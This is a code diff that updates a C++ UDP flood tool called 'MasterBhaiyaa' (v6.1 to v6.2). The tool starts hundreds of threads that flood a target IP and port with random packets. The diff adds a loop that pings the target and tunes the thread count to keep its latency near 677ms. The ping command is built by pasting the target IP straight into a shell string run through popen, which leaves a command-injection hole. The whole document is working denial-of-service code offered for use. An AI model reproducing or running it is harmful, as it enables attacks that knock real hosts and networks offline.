@@ -13,11 +13,12 @@
 #include <fcntl.h>
 #include <random>
 
-#define MAX_THREADS 700
-#define MIN_THREADS 500
+#define MAX_THREADS 650
+#define MIN_THREADS 530
 #define DEFAULT_PAYLOAD_SIZE 24
 #define BINARY_NAME "MasterBhaiyaa"
 #define TARGET_PING 677
+#define PING_CHECK_INTERVAL 2
 
 std::atomic<bool> stop_flag(false);
 std::atomic<int> dynamic_threads(MIN_THREADS);
@@ -54,18 +55,32 @@ void generate_payload(std::vector<uint8_t> &buffer, size_t size) {
 }
 
 // Simulated function to get target response time (ping)
-int get_target_ping() {
-    return rand() % 800; // Simulates fluctuating ping (randomized)
+int get_target_ping(const std::string &target_ip) {
+    std::string command = "ping -c 1 -W 1 " + target_ip + " | grep 'time=' | awk -F'=' '{print $NF}' | awk '{print int($1)}'";
+    FILE *pipe = popen(command.c_str(), "r");
+    if (!pipe) return -1;
+
+    char buffer[16];
+    fgets(buffer, sizeof(buffer), pipe);
+    pclose(pipe);
+
+    int ping = atoi(buffer);
+    return (ping > 0) ? ping : 800; // Default to high value if no response
 }
 
 // AI-Controlled Attack Rate Adjustment (Keeps Ping at 677ms)
-void adjust_attack_rate() {
-    int current_ping = get_target_ping();
+void adjust_attack_rate(const std::string &target_ip) {
+    while (!stop_flag) {
+        int current_ping = get_target_ping(target_ip);
 
-    if (current_ping < TARGET_PING) {
-        dynamic_threads = std::min(MAX_THREADS, dynamic_threads + 50);  // Increase attack if ping is too low
-    } else if (current_ping > TARGET_PING) {
-        dynamic_threads = std::max(MIN_THREADS, dynamic_threads - 50);  // Reduce attack if ping is too high
+        if (current_ping < TARGET_PING - 10) {
+            dynamic_threads = std::min(MAX_THREADS, dynamic_threads + 20);
+        } else if (current_ping > TARGET_PING + 10) {
+            dynamic_threads = std::max(MIN_THREADS, dynamic_threads - 20);
+        }
+
+        std::cout << "[AI] Current Ping: " << current_ping << "ms | Adjusting Threads: " << dynamic_threads.load() << "\n";
+        std::this_thread::sleep_for(std::chrono::seconds(PING_CHECK_INTERVAL));
     }
 }
 
@@ -90,7 +105,6 @@ void udp_attack(const AttackConfig &config) {
             sendto(sock, payload.data(), payload.size(), 0, (struct sockaddr *)&target_addr, sizeof(target_addr));
         }
         generate_payload(payload, config.payload_size);  // AI-based payload switching
-        adjust_attack_rate(); // AI maintains fixed 677ms ping
     }
 
     close(sock);
@@ -116,24 +130,29 @@ int main(int argc, char *argv[]) {
 
     std::signal(SIGINT, handle_signal);
 
-    std::cout << "🔥 MasterBhaiyaa v6.1 - AI-Powered UDP (Fixed 677ms Ping) 🔥\n";
+    std::cout << "🔥 MasterBhaiyaa v6.2 - AI-Powered UDP (677ms Fixed Ping) 🔥\n";
     std::cout << "© 2024-2054 @MasterBhaiyaa\n";
     std::cout << "=====================================\n";
     std::cout << "Target: " << config.ip << ":" << config.port << "\n";
     std::cout << "Duration: " << config.duration << " sec\n";
-    std::cout << "Threads: " << dynamic_threads << "\n";
+    std::cout << "Threads: " << dynamic_threads.load() << "\n";
     std::cout << "Payload Size: " << config.payload_size << " bytes\n";
     std::cout << "Target Ping: " << TARGET_PING << " ms (AI-Controlled)\n";
     std::cout << "=====================================\n\n";
 
+    std::thread ping_monitor(adjust_attack_rate, config.ip);
+
     std::vector<std::thread> threads;
-    for (int i = 0; i < dynamic_threads; ++i) {
+    for (int i = 0; i < dynamic_threads.load(); ++i) {
         threads.emplace_back(udp_attack, config);
     }
 
     for (auto &thread : threads) {
         thread.join();
     }
+
+    stop_flag = true;
+    ping_monitor.join();
 
     std::cout << "\n[✔] AI-Powered UDP attack completed.\n";
     std::cout << "© @MasterBhaiyaa\n";
